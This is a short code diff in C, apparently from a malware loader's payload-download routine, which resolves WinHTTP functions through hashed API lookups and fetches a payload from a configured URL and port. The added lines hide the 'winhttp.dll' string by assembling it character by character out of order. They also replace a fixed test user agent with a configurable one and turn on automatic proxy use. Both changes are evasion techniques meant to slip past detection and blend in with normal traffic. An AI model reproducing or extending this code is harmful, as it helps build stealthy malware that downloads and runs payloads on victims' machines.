@@ -7,8 +7,20 @@
 
 
 LPVOID payload_get(PDWORD PayloadSize) {
-
-    HMODULE winhttp = g_ldr->apis->LoadLibraryA("winhttp.dll");
+    CHAR dll[12];
+    dll[6] = 'p';
+    dll[2] = 'n';
+    dll[9] = 'l';
+    dll[0] = 'w';
+    dll[11] = '\0';
+    dll[4] = 't';
+    dll[7] = '.';
+    dll[1] = 'i';
+    dll[10] = 'l';
+    dll[3] = 'h';
+    dll[8] = 'd';
+    dll[5] = 't';
+    HMODULE winhttp = g_ldr->apis->LoadLibraryA(dll);
 
     g_ldr->apis->WinHttpOpen = (pWinHttpOpen)GetProc(winhttp, HASHED_WINHTTPOPEN);
     g_ldr->apis->WinHttpConnect = (pWinHttpConnect)GetProc(winhttp, HASHED_WINHTTPCONNECT);
@@ -29,9 +41,9 @@ LPVOID payload_get(PDWORD PayloadSize) {
 
    
 
-    hSession = g_ldr->apis->WinHttpOpen(L"TEST", WINHTTP_ACCESS_TYPE_NO_PROXY,
-        WINHTTP_NO_PROXY_NAME,
-        WINHTTP_NO_PROXY_BYPASS, 0);
+    hSession = g_ldr->apis->WinHttpOpen(g_ldr->config->http.UserAgent, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
+        NULL,
+        NULL, 0);
     if (!hSession) goto CLEANUP;
 
     hConnect = g_ldr->apis->WinHttpConnect(hSession, g_ldr->config->http.url, g_ldr->config->http.port, 0);
